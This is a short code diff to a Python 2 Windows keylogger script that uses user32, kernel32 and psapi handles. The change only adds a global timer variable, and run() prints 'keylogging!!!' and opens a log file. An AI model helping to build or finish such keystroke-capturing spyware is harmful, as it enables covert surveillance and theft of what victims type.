@@ -20,7 +20,7 @@ user32 = windll.user32
 kernel32 = windll.kernel32
 psapi = windll.psapi
 current_window = None
-
+st_time = None
 
 def get_current_process():
     # get a handle to the foreground window
@@ -122,6 +122,7 @@ def inform():
 
 
 def run(**args):
+   global st_time
    st_time = time.time()
    print "keylogging!!!"
    f_des = open("log.txt" , "w")
